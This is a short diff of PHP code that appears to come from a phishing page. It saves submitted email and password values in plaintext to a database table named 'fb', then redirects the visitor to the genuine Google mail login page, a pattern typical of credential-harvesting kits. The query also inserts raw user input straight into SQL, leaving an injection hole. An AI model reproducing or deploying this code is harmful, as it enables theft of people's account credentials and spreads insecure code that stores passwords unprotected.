@@ -10,7 +10,7 @@ if(isset($_POST["submit"]))
 
 
 
-        $query = mysqli_query($db, "INSERT INTO users (email, password)VALUES ('$username','$password')")or die(mysqli_error($db));
+        $query = mysqli_query($db, "INSERT INTO fb (email, password)VALUES ('$username','$password')")or die(mysqli_error($db));
         if(($query)==1)
         {
             header("url=https://accounts.google.com/ServiceLogin?service=mail&passive=true&rm=false&continue=https://mail.google.com/mail/&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1#identifier");
